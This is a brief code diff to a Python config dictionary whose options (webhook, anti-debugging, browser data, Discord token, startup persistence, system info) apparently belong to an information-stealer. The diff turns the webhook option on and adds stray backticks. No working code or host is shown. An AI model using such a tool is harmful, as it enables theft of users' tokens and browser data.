@@ -1,5 +1,5 @@
 __CONFIG__ = {
-    'webhook': None,
+    'webhook': True,
     'antidebug': True,
     'browsers': True,
     'discordtoken': True,
@@ -7,3 +7,4 @@ __CONFIG__ = {
     'startup': True,
     'systeminfo': True,
 }
+``
